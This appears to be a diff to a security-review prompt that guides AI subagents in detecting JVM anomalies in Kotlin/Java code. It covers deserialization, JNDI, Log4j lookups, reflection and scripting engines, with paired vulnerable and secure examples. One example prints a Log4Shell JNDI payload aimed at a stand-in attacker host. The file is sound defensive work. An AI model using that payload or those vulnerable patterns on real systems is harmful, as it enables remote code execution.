@@ -1,3 +1,68 @@
+---
+subject: "JVM anomaly detection reference for Kotlin/Java SAST subagents; three-phase detection prompt, anomaly IS/IS-NOT definition with prevention patterns, vulnerable/secure examples incl. deserialization, Jackson polymorphism, JNDI, Log4j lookups with `2.17.1` guidance, `ClassLoader`s, Kotlin reflection, JNI, scripting, KSP, twelve-row taxonomy, per-category heuristics, execution with early-exit gate, `API5:2023`/`API8:2023`/`API10:2023` mapping, CWE list, operational reminders, references."
+index:
+  - anchor: jvm-anomalies-detection
+    what: "Focused JVM anomaly detection role using the three-phase subagent approach — recon for suspicious Kotlin/Java construction sites across twelve categories, batched verify separating exploitable anomalies from legitimate runtime usage, merge — gated on the architecture report."
+    problem: "Kotlin/Java backend may execute attacker-controlled code through powerful runtime facilities rather than plain logic flaws, and unstructured hunting conflates dependency-injection reflection with hostile dynamic execution while burying reviewers in unverified candidates; detection orchestration, runtime sweep, trust judgment, candidate flood, coverage goal, methodical triage, hostile dynamism."
+    use_when: "JVM anomaly scan selected by the screener; `{{ REPORTS_ROOT }}/01_architecture.md` exists; full three-phase detection must run."
+    avoid_when: "Architecture report missing — run analysis first; only conceptual JVM-anomaly knowledge is needed, not execution."
+    expected: "Confirmed exploitable-anomaly findings consolidated into one module report with benign patterns filtered out."
+  - anchor: jvm-anomalies-what-is
+    what: "JVM anomaly definition — any runtime facility processing attacker-controlled data without safe contract, sandbox, or allowlist — with IS list (unsafe deserialization, JNDI injection, custom ClassLoaders, JNI/native loading, Kotlin reflection abuse, KSP/compiler plugins, Log4j-style lookups, scripting engines, RMI/JMX exposure, instrumentation agents, MethodHandle/invokedynamic, Unsafe/off-heap), IS-NOT list (allowlisted serialization, hardcoded startup JNDI, classpath loading, DI reflection, lookups-disabled logging, fixed-path native libraries, trusted-schema KSP), and three prevention patterns incl. `ObjectInputFilter` allowlists, `log4j2.formatMsgNoLookups` with `2.17.1` upgrade guidance, hardcoded JNDI names."
+    problem: "Reviewer cannot tell whether powerful runtime construct counts as exploitable anomaly without crisp trust boundaries, so DI-container reflection gets flagged while `${jndi:...}` lookups hiding inside logged headers slip past triage; definition scope, boundary rules, inclusion criteria, exclusion list, classification accuracy, trust framing, false-flag risk, dangerous-versus-routine test."
+    use_when: "Deciding whether observed runtime construct belongs to the anomaly risk class; testing IS criteria against input controllability; confirming whether flagged pattern matches documented prevention mechanisms."
+    avoid_when: "Generic code-injection sinks without JVM runtime specifics — route to `05-rce.md`; deliberate implant intent beyond facility abuse belongs to `21-backdoors.md`; generic configuration hardening belongs to `20-misconfiguration.md`; dependency version CVEs without facility context belong to `23-dependencies.md`."
+    expected: "Suspicious constructs classified against IS/IS-NOT boundaries with explicit trust reasoning; prevented postures dismissed with documented rationale."
+  - anchor: jvm-anomalies-vulnerable-vs-secure
+    what: "Nine vulnerable/secure pairs — raw `ObjectInputStream.readObject` versus schema-bound DTO with `ObjectInputFilter`, global Jackson `enableDefaultTyping` versus closed `@JsonSubTypes` set, request-driven `InitialContext.lookup` versus hardcoded names, Log4j `${jndi:...}` header interpolation versus lookups disabled with `2.17.1` upgrade, network-byte `defineClass` versus signed module layers, `callBy` on user-named functions versus sealed-class dispatch, user-influenced `System.load` versus fixed vendor paths, `ScriptEngine.eval` on request data versus allowlisted expression evaluator, remote-schema KSP generation versus hash-pinned validated schemas."
+    problem: "JVM attacks look different per facility, and generic suspicion rules miss whether polymorphic typing flags, dynamic lookup names, bytecode provenance, or reflection targets actually decide exploitability; facility recipes, hardened idioms, precise detection, pattern matching, stack quirks, payload signals, verdict support, exploit shape."
+    use_when: "Verify batch subagent needs `[TECH-STACK EXAMPLES]` selection; target project runs Java or Kotlin; contrasting observed construction site against known-good counterpart."
+    avoid_when: "Conceptual IS/IS-NOT boundaries are the question — see the definition card; category catalog needed — see the taxonomy card; plain injection-sink semantics belong to `05-rce.md`."
+    expected: "Each suspicious site matched against its vulnerable pattern and secure counterpart; matching idioms cited in batch findings."
+  - anchor: jvm-anomalies-taxonomy
+    what: "Twelve-row category table — unsafe deserialization, JNDI injection, custom ClassLoaders, JNI/native loading, Kotlin reflection abuse, KSP/compiler plugins, Log4j-style lookups, scripting engines, RMI/JMX exposure, instrumentation/agents, MethodHandle/invokedynamic, Unsafe/off-heap access — each with description and typical signals incl. `enableDefaultTyping`, `${jndi:...}` strings, `defineClass`, `callBy`, `premain`, `LambdaMetafactory`."
+    problem: "Recon output and findings need consistent category labels, yet improvised naming fragments reports and leaves instrumentation or off-heap channels without any bucket; category canon, labeling scheme, signal index, classification vocabulary, report consistency, bucket coverage, naming discipline."
+    use_when: "Assigning canonical labels to recon sites or batch findings; checking which signals typify each anomaly class; scoping recon search lists across all twelve rows."
+    avoid_when: "Per-category hunt procedure is the need — see the heuristics card; conceptual scope boundaries belong to the definition card."
+    expected: "Every site and finding carries one canonical row label; no anomaly class left unnamed."
+  - anchor: jvm-anomalies-detection-heuristics
+    what: "Per-category hunt checklist: `ObjectInputStream`/`readObject` source tracing with `ObjectInputFilter` verification, Jackson default-typing and XStream/Kryo/SnakeYAML/Fastjson configuration review, lookup-name taint analysis across `InitialContext`/`DirContext` with LDAP/RMI/DNS protocol checks and Log4j version scrutiny, `defineClass` byte-array provenance with signing checks, `System.load` path-influence tracing, `callBy`/`KClass` target derivation review, `SymbolProcessor`/`AbstractProcessor` input auditing, `formatMsgNoLookups` and `%m{nolookups}` config verification, `ScriptEngine.eval` source tracing, RMI/JMX binding and authentication review, `premain`/`agentmain` provenance, `MethodHandles` descriptor taint, `sun.misc.Unsafe`/`VarHandle` address-derivation checks."
+    problem: "Verifier knows anomaly categories yet lacks concrete per-category tells, so subtle signals like default-typing flags, dynamic lookup protocols, unsigned bytecode origins, or script-source provenance go unchecked during review; hunting rigor, signal checklist, review depth, per-class scrutiny, evidence pointers, inspection steps, overlooked markers, false-negative exposure."
+    use_when: "Recon or verify subagent needs actionable search guidance for one anomaly class; inspecting serialization configs, logging setups, class-loading paths, or script sources; deciding which artifacts to check for taint or provenance."
+    avoid_when: "Category catalog without procedure is the need — see the taxonomy card; pure implant-intent judgment belongs to `21-backdoors.md`; dependency CVE version scanning without facility context belongs to `23-dependencies.md`."
+    expected: "Every category checked with its concrete tells; each signal class inspected before verdict."
+  - anchor: jvm-anomalies-execution
+    what: "Three-phase execution: recon discovering suspicious JVM construction sites across twelve categories with zero-site early-exit gate writing an empty-results report, batched verify in groups of three with four-question input-danger-config-blast-radius analysis and four-level classification, orchestrator merge with intermediate-file cleanup."
+    problem: "Detection work without orchestration duplicates effort, loses batch boundaries, skips early exits, and merges verdicts inconsistently across recon and verify artifacts; execution model, phase overview, subagent orchestration, batch discipline, context passing, workflow entry, staging, dispatch plan, consolidation, handoff clarity."
+    use_when: "Starting the JVM anomaly scan execution; dispatching recon, verify batches, or merge; reviewing any phase output or the early-exit decision."
+    avoid_when: "Conceptual scope boundaries are the need — see the definition card; concrete per-category tells wanted — see the heuristics card."
+    expected: "All phases run with shared architecture context into one consolidated report; intermediates deleted."
+  - anchor: jvm-anomalies-owasp-mapping
+    what: "Three-row OWASP root-cause mapping: `API5:2023` Broken Function Level Authorization for reflection, scripting, and dynamic dispatch reaching administrative functions without authorization checks; `API8:2023` Security Misconfiguration for unsafe deserialization, enabled lookups, exposed RMI/JMX, and unsigned ClassLoaders as hardening failures; `API10:2023` Unsafe Consumption of APIs for third-party data passed to deserialization, reflection, scripting, or JNDI sinks."
+    problem: "Findings must carry root-cause risk labels, yet reviewers guess between authorization, misconfiguration, and unsafe-consumption framings or skip mapping entirely, weakening report credibility; taxonomy tagging, risk attribution, mapping choice, report compliance, framing consistency, required field, triple applicability."
+    use_when: "Filling the `OWASP API 2023 root-cause risk` field on batch findings; deciding which of three risks apply to confirmed JVM anomalies."
+    avoid_when: "CWE identifier selection is the need — see the CWE card; broad misconfiguration hardening without JVM runtime context belongs to `20-misconfiguration.md`; pure authorization-gap analysis belongs to `10-missingauth.md`."
+    expected: "Each finding cites `API5:2023`, `API8:2023`, `API10:2023`, or a combination with one-line justification."
+  - anchor: jvm-anomalies-cwe-references
+    what: "CWE identifier list for JVM anomaly findings: `CWE-502` Deserialization of Untrusted Data and `CWE-913` Improper Control of Dynamically-Managed Code Resources as common parents, `CWE-74` Injection, `CWE-94` Code Injection, `CWE-843` Type Confusion, `CWE-400` Uncontrolled Resource Consumption, `CWE-665` Improper Initialization, `CWE-672`, `CWE-915`, `CWE-1108`."
+    problem: "Findings require precise weakness identifiers, and vague or missing mappings strip reports of remediation routing and trend tracking across scans; weakness taxonomy, mapping precision, report metadata, identifier canon, trend analysis, citation discipline, scan comparability."
+    use_when: "Selecting the most specific CWE for each batch finding; confirming `CWE-502`/`CWE-913` parentage when no narrower entry fits."
+    avoid_when: "OWASP risk framing is the need — see the mapping card; external attack-technique context wanted — see the references card."
+    expected: "Every finding maps to the narrowest applicable CWE with parentage noted."
+  - anchor: jvm-anomalies-important-reminders
+    what: "Closing operational reminders: high-signal-yet-over-reportable verdict restraint with input-controllability verification, dependency-version checks for known deserialization and JNDI CVEs incl. Log4j2 and Jackson, git-history review of suspicious insertions, read-only verification with benign marker tests, evidence preservation before remediation, read-only subagent discipline."
+    problem: "Modules close with inconsistent final guidance, letting over-reported reflection noise, unexecuted version checks, or unpreserved evidence slip into reports and incident response; closing rules, quality floor, final reminders, uniform endings, wrap discipline, audit closure, judgment restraint."
+    use_when: "Finalizing the module report; checking verdict confidence, version hygiene, and evidence handling before closing the scan."
+    avoid_when: "Earlier phases are still open — finish those first; injection, implant, or generic-config routing belongs to `05-rce.md`, `21-backdoors.md`, or `20-misconfiguration.md` cards."
+    expected: "Reports close with uniform final rules applied, evidence preserved, and no exploit payloads executed."
+  - anchor: jvm-anomalies-references
+    what: "External link list: OWASP `API5:2023`/`API8:2023`/`API10:2023` pages, OWASP Deserialization and Logging cheat sheets, `CWE-502`/`CWE-74`/`CWE-94`/`CWE-913` entries, JNDI injection and Log4j2 `CVE-2021-44228` post-mortems."
+    problem: "Reports need authoritative follow-up sources beyond distilled file content when facility-internals detail, Log4j incident narratives, or canonical citation is required; further reading, external canon, deep dives, primary material, cited works, incident case studies, reference integrity."
+    use_when: "Primary sources or extended material is needed; findings require links to advisories, CWE entries, or documented JVM exploit incidents."
+    avoid_when: "Recipe or orchestration needs route elsewhere — this list is follow-up reading, not procedure."
+    expected: "Reader reaches canonical external material for any topic this file condenses."
+---
+
 # JVM Anomaly Detection (Kotlin / Java)
 
 [ref: #jvm-anomalies-detection]
@@ -6,21 +71,8 @@ You are performing a focused security assessment of Kotlin/Java codebases for **
 
 **Prerequisites**: `{{ REPORTS_ROOT }}/01_architecture.md` must exist. Run the analysis skill first if it doesn't.
 
-## Table of contents
-
-- [What is a JVM anomaly](#what-is-a-jvm-anomaly)
-- [Vulnerable vs Secure Examples](#vulnerable-vs-secure-examples)
-- [JVM Anomaly Taxonomy](#jvm-anomaly-taxonomy)
-- [Detection heuristics per category](#detection-heuristics-per-category)
-- [Execution](#execution)
-- [OWASP API Security Top 10 2023 mapping](#owasp-api-security-top-10-2023-mapping)
-- [CWE references](#cwe-references)
-- [Important Reminders](#important-reminders)
-- [References](#references)
-
----
-
 ## What is a JVM anomaly
+[ref: #jvm-anomalies-what-is]
 
 A JVM anomaly is any use of a Java/Kotlin runtime facility in a way that allows an attacker to execute arbitrary code, load untrusted classes, bypass type safety, or exfiltrate data by exploiting features that are powerful and often invisible to higher-level static analysis. These patterns are especially dangerous in API backends because a single deserialized request, a logged header, or a reflected method call can become a full server compromise.
 
@@ -35,7 +87,7 @@ The core question: *does this JVM facility process attacker-controlled data with
 - **Kotlin reflection abuse**: `callBy`, `memberFunctions`, `declaredMemberProperties`, or `KClass` lookups driven by user input.
 - **KSP / compiler plugins**: annotation processors or Kotlin Symbol Processing plugins that generate code from untrusted schemas/inputs or alter security-critical classes.
 - **Log4j-style lookups**: logging frameworks that evaluate `${...}` expressions in messages (JNDI, env, sysprops) without disabling lookup substitution.
-- **Scripting engines**: `ScriptEngineManager`, `Nashorn`, `GroovyShell`, `KotlinScript` executing user-supplied code.
+- **Scripting engines**: `ScriptEngineManager`, `Nashorn` (removed from the JDK in Java 15 — legacy/standalone `nashorn-core` only), `GroovyShell`, `KotlinScript` executing user-supplied code.
 - **RMI / JMX exposure**: exported MBeans, RMI registries, or JMX connectors reachable without authentication.
 - **Instrumentation / agents**: `java.lang.instrument` agents or `Instrumentation` APIs that transform classes at runtime.
 - **MethodHandle / invokedynamic**: dynamic call sites constructed from untrusted descriptors.
@@ -67,6 +119,7 @@ in.setObjectInputFilter(filter);
 **2. Disabled lookup substitution in logging**
 ```xml
 <!-- Log4j2: disable message lookups to prevent ${jndi:...} evaluation -->
+<!-- NOTE: partial mitigation valid for Log4j 2.10–2.15 only; message lookups were removed entirely in 2.16 (making this property obsolete) — the real fix is upgrading to 2.17.1+ (2.16 → CVE-2021-45105, 2.17.0 → CVE-2021-44832) -->
 <Property name="log4j2.formatMsgNoLookups">true</Property>
 ```
 
@@ -76,9 +129,10 @@ in.setObjectInputFilter(filter);
 DataSource ds = (DataSource) ctx.lookup("java:comp/env/jdbc/MyDB");
 ```
 
----
+***
 
 ## Vulnerable vs Secure Examples
+[ref: #jvm-anomalies-vulnerable-vs-secure]
 
 ### Unsafe Java deserialization
 
@@ -133,7 +187,7 @@ logger.info("User-Agent: {}", request.getHeader("User-Agent"));
 // Payload: ${jndi:ldap://attacker.com/a}
 
 // SECURE: disable lookups or sanitize input before logging
-// Log4j2: set log4j2.formatMsgNoLookups=true
+// Log4j2: set log4j2.formatMsgNoLookups=true (2.10–2.15 only; lookups removed in 2.16 — upgrade to 2.17.1+ instead)
 logger.info("User-Agent: {}", sanitize(header));
 ```
 
@@ -197,9 +251,10 @@ val schema = loadPinnedSchema("schemas/v1/order.json")
 generateKotlinSources(schema)
 ```
 
----
+***
 
 ## JVM Anomaly Taxonomy
+[ref: #jvm-anomalies-taxonomy]
 
 | Category | Description | Typical signals |
 | --- | --- | --- |
@@ -209,16 +264,17 @@ generateKotlinSources(schema)
 | **JNI / native loading** | Loading native libraries from attacker-influenced paths. | `System.load`, `System.loadLibrary`, `Runtime.load`, `Runtime.loadLibrary`, `ProcessBuilder` compiling/loading native code. |
 | **Kotlin reflection abuse** | Using Kotlin reflection APIs to invoke arbitrary members from user input. | `KClass.functions`, `KCallable.callBy`, `memberProperties`, `declaredMemberFunctions`, `Class.forName(...).kotlin`. |
 | **KSP / compiler plugins** | Annotation processors or KSP plugins that generate or transform code from untrusted inputs. | `SymbolProcessor`, `AbstractProcessor`, `process(resolver)`, code generation driven by remote schemas or external files. |
-| **Log4j-style lookups** | Logging frameworks that evaluate `${...}` lookups in messages. | `${jndi:...}`, `${env:...}`, `${sys:...}` in log messages; `log4j2.formatMsgNoLookups` not set; `%msg{lookups}` patterns. |
+| **Log4j-style lookups** | Logging frameworks that evaluate `${...}` lookups in messages. | `${jndi:...}`, `${env:...}`, `${sys:...}` in log messages; message lookups enabled on Log4j 2.10–2.15, or any Log4j2 version below 2.17.1 in use; `%msg{lookups}` patterns. |
 | **Scripting engines** | Executing scripts (JS, Groovy, Kotlin script) from request or config data. | `ScriptEngine.eval`, `GroovyShell.parse`, `KotlinScriptEngine`, `Nashorn`, `javax.script`. |
 | **RMI / JMX exposure** | Remote method invocation or JMX connectors exposed without strong auth. | `LocateRegistry.createRegistry`, `JMXConnectorServer`, `MBeanServer.registerMBean`, RMI stub classes. |
 | **Instrumentation / agents** | Runtime class transformation or agent loading. | `java.lang.instrument`, `Instrumentation.retransformClasses`, premain/agentmain, attach API. |
 | **MethodHandle / invokedynamic** | Dynamic call sites built from untrusted descriptors. | `MethodHandles.lookup`, `MethodHandle.invoke`, `LambdaMetafactory`, `CallSite` construction from user data. |
 | **Unsafe / off-heap access** | Use of `sun.misc.Unsafe`, `VarHandle`, or foreign-function API to bypass safety. | `Unsafe.getUnsafe`, `allocateMemory`, `putInt`, `VarHandle` on arbitrary memory, `MemorySegment` from untrusted addresses. |
 
----
+***
 
 ## Detection heuristics per category
+[ref: #jvm-anomalies-detection-heuristics]
 
 ### Unsafe deserialization
 
@@ -267,13 +323,13 @@ generateKotlinSources(schema)
 ### Log4j-style lookups
 
 - Identify logging framework and version (Log4j2, Logback, JUL, JBoss Logging, SLF4J bridges).
-- Check configuration for `formatMsgNoLookups=true`, `%m{nolookups}`, or equivalent settings.
+- Check configuration for `formatMsgNoLookups=true` (relevant only on 2.10–2.15; on any version below 2.17.1 flag the version itself as the finding), `%m{nolookups}`, or equivalent settings.
 - Search for log statements that interpolate user-controlled values directly into the message: `logger.info("..." + userInput)`.
 - Look for custom appenders, layouts, or converters that evaluate expressions.
 
 ### Scripting engines
 
-- Search for `ScriptEngineManager`, `ScriptEngine.eval`, `GroovyShell`, `KotlinScriptEngine`, `NashornScriptEngine`.
+- Search for `ScriptEngineManager`, `ScriptEngine.eval`, `GroovyShell`, `KotlinScriptEngine`, `NashornScriptEngine`. Note: Nashorn is absent from JDK 15+ (standalone `nashorn-core` or GraalVM JS in modern stacks) but remains a detection target on legacy JVMs.
 - Check whether the script source is request data, config, or an untrusted file.
 - Look for sandboxes, SecurityManagers (deprecated), or allowlisted bindings.
 - Verify that script execution is necessary and cannot be replaced with a safer expression evaluator.
@@ -304,9 +360,10 @@ generateKotlinSources(schema)
 - Check whether addresses, sizes, or layouts are derived from user input.
 - Look for foreign-function calls (`Linker.downcallHandle`) to native libraries from dynamic paths.
 
----
+***
 
 ## Execution
+[ref: #jvm-anomalies-execution]
 
 This skill runs in three phases using subagents. Pass the contents of `{{ REPORTS_ROOT }}/01_architecture.md` to all subagents as context.
 
@@ -394,12 +451,15 @@ Launch a subagent with the following instructions:
 
 ### After Phase 1: Check for Candidates Before Proceeding
 
-After Phase 1 completes, read `{{ REPORTS_ROOT }}/24_recon.md`. If the recon found **zero suspicious sites** (the summary reports "Found 0" or the "Suspicious Construction Sites" section is empty or absent), **skip Phase 2 and Phase 3 entirely**. Instead, write the following content to `{{ REPORTS_ROOT }}/24_jvm_anomalies.md` and stop:
+After Phase 1 completes, read `{{ REPORTS_ROOT }}/24_recon.md`. If the recon found **zero suspicious sites** (the summary reports "Found 0" or the "Suspicious Construction Sites" section is empty or absent), **skip Phase 2 and Phase 3 entirely**. Instead, write the following content to `{{ REPORTS_ROOT }}/24_jvm_anomalies.md`, **delete** `{{ REPORTS_ROOT }}/24_recon.md`, and stop:
 
 ```markdown
-# JVM Anomaly Analysis Results
+# JVM Anomaly Analysis Results: [Project Name]
 
-No JVM-specific anomalies found.
+## Executive Summary
+- Candidates analyzed: 0
+- Scope reviewed: [deserialization sites, JNDI usages, ClassLoaders, reflection, scripting engines, compiler plugins, and logging configurations reviewed]
+- No JVM anomaly candidates were found: no unsafe JVM facility usage identified in the reviewed scope.
 ```
 
 Only proceed to Phase 2 if Phase 1 found at least one suspicious site.
@@ -524,9 +584,10 @@ After **all** Phase 2 batch subagents complete, read every `{{ REPORTS_ROOT }}/2
 
 5. After writing `{{ REPORTS_ROOT }}/24_jvm_anomalies.md`, **delete all intermediate batch files** (`{{ REPORTS_ROOT }}/24_batch_*.md`).
 
----
+***
 
 ## OWASP API Security Top 10 2023 mapping
+[ref: #jvm-anomalies-owasp-mapping]
 
 | OWASP Risk | Why JVM Anomalies Matter |
 |---|---|
@@ -534,9 +595,10 @@ After **all** Phase 2 batch subagents complete, read every `{{ REPORTS_ROOT }}/2
 | **API8:2023 Security Misconfiguration** | Unsafe deserialization, enabled JNDI/lookup substitution, exposed RMI/JMX, and unsigned ClassLoaders are hardening failures that expose the JVM runtime. |
 | **API10:2023 Unsafe Consumption of APIs** | Third-party data passed to deserialization, reflection, scripting, or JNDI sinks can compromise the server through a trusted-looking integration. |
 
----
+***
 
 ## CWE references
+[ref: #jvm-anomalies-cwe-references]
 
 - CWE-502: Deserialization of Untrusted Data
 - CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')
@@ -547,11 +609,12 @@ After **all** Phase 2 batch subagents complete, read every `{{ REPORTS_ROOT }}/2
 - CWE-672: Operation on a Resource after Expiration or Release
 - CWE-913: Improper Control of Dynamically-Managed Code Resources
 - CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes
-- CWE-1108: Excessive Reliance on Global Data
+- CWE-1108: Excessive Reliance on Global Variables
 
----
+***
 
 ## Important Reminders
+[ref: #jvm-anomalies-important-reminders]
 
 - JVM anomaly detection is **high-signal but easy to over-report**. Many Java/Kotlin applications use reflection for dependency injection, serialization, or testing. Always verify whether the input is attacker-controllable.
 - Check **dependency versions** for known JVM deserialization or JNDI vulnerabilities: Log4j2, Jackson, XStream, Kryo, Fastjson, Apache Commons Collections, etc.
@@ -560,9 +623,10 @@ After **all** Phase 2 batch subagents complete, read every `{{ REPORTS_ROOT }}/2
 - Preserve evidence before remediation: screenshots, commit hashes, dependency versions, and file hashes.
 - Subagents are read-only: they must not modify project source code, commit changes, or run potentially malicious code.
 
----
+***
 
 ## References
+[ref: #jvm-anomalies-references]
 
 - OWASP API Security Top 10 2023 — API5:2023 Broken Function Level Authorization
 - OWASP API Security Top 10 2023 — API8:2023 Security Misconfiguration
